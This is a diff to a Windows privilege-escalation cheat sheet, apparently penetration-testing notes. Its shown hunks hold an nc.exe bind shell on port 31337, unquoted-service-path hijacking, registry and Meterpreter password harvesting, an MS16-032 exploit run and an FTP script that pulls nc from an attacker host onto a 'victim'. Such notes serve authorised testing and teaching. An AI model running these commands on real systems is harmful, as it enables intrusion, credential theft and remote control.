@@ -1,6 +1,6 @@
 *Windows elevation of privileges*narrative
 From RCE to shell
-    Getting a shell
+    Getting a shell in limited interpreters:
     *$ system("start cmd.exe /k $cmd")*
     Bind cmd to a port:
     *$ nc.exe -Lp 31337 -vv -e cmd.exe*
@@ -113,10 +113,10 @@ sc start <vuln-service>*
 EoP 2: Find unquoted paths
     If we find a service running as SYSTEM/Administrator with an unquoted path and spaces in the path we can hijack the path and use it to elevate privileges. This occurs because windows will try, for every whitespace, to find the binary in every intermediate folder.
     For example, the following path would be vulnerable:
-    *c:\Program Files\something\winamp.exe*
+    *C:\Program Files\something\winamp.exe*
     We could place our payload with any of the following paths:
-    *c:\Program.exe*
-    *c:\Program Files.exe*
+    *C:\Program.exe*
+    *C:\Program Files.exe*
     The following command will display affected services:
     *$ wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """*
 
@@ -162,7 +162,7 @@ reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password*
 reg query HKCU /f password /t REG_SZ /s*
     Using meterpreter:
     *> post/windows/gather/credentials/gpp
-post/windows/gather/enum_unattend*
+> post/windows/gather/enum_unattend*
 
 EoP 4: Pass the hash
     Pass The Hash allows an attacker to authenticate to a remote target by using a valid combination of username and NTLM/LM hash rather than a cleartext password.
@@ -393,7 +393,7 @@ netsh firewall set service remotedesktop enable*
     *C:\tmp>powershell -ExecutionPolicy ByPass -command "& { . C:\tmp\Invoke-MS16-032.ps1; Invoke-MS16-032 }"*
 
 Transferring files
-    with ftp (run ftp.sh in your box):
+    Paste the following code to get nc in the victim:
     *echo open <attacker_ip> 21> ftp.txt
 echo USER offsec>> ftp.txt
 echo ftp>> ftp.txt
@@ -412,7 +412,7 @@ PASS foo
 PORT 127,0,0,1,0,80
 200 Port command successful.
 LIST*
-    With RDP:
+    Nice trick to share folders with RDP:
     *$ rdesktop (ip) -r disk:share=/home/bayo/store*
 
     With powershell:
